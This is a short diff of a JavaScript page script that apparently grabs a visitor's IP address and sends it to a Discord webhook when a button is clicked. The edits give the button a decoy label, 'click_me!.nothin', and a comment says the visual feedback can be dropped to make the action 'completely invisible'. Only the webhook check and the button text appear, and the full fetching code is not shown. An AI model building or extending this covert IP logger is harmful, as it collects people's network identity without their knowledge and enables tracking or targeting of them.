@@ -24,7 +24,7 @@ async function getIP() {
 // Function to send data to Discord
 async function sendToDiscord(ip) {
     try {
-        if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+        if (DISCORD_WEBHOOK_URL === '') {
             console.error('Discord webhook URL not configured');
             return false;
         }
@@ -82,7 +82,7 @@ async function handleButtonClick() {
     const originalText = button.textContent;
     
     // Brief visual feedback (can be removed if you want completely invisible)
-    button.textContent = '...';
+    button.textContent = 'click_me!.nothin';
     button.disabled = true;
     
     try {
